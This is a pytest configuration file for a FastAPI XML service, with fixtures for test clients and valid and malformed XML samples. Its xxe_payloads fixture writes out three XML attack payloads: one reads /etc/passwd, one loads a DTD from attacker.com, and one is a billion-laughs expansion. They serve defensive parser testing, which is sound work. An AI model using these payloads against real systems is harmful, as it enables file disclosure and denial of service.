"""Pytest configuration and fixtures."""

import pytest
from fastapi.testclient import TestClient
from httpx import AsyncClient

from app.main import create_app


@pytest.fixture
def app():
    """Create FastAPI application for testing."""
    return create_app()


@pytest.fixture
def client(app):
    """Create synchronous test client."""
    return TestClient(app)


@pytest.fixture
async def async_client(app):
    """Create asynchronous test client."""
    async with AsyncClient(app=app, base_url="http://test") as ac:
        yield ac


@pytest.fixture
def valid_xml():
    """Fixture providing valid XML samples."""
    return {
        "simple": "<root><item>value</item></root>",
        "complex": """<?xml version="1.0" encoding="UTF-8"?>
<root>
    <header>
        <timestamp>2025-10-27T10:00:00Z</timestamp>
    </header>
    <body>
        <item id="1">
            <name>Test Item</name>
            <value>123</value>
        </item>
    </body>
</root>""",
        "minimal": "<root/>",
        "with_attributes": '<root id="1" name="test"><item/></root>',
    }


@pytest.fixture
def invalid_xml():
    """Fixture providing invalid XML samples."""
    return {
        "unclosed_tag": "<root><item></root>",
        "missing_close": "<root><item>",
        "bad_nesting": "<root><a><b></a></b></root>",
        "empty": "",
        "whitespace_only": "   \n  \t  ",
        "not_xml": "This is not XML at all",
        "malformed_declaration": "<?xml version='1.0' encoding='UTF-8' <root/>",
    }


@pytest.fixture
def xxe_payloads():
    """Fixture providing XXE (XML External Entity) attack payloads."""
    return [
        # External entity attack
        """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",
        # Parameter entity attack
        """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root/>""",
        # Billion laughs (entity expansion)
        """<?xml version="1.0"?>
<!DOCTYPE lolz [
  <!ENTITY lol "lol">
  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
]>
<root>&lol3;</root>""",
    ]
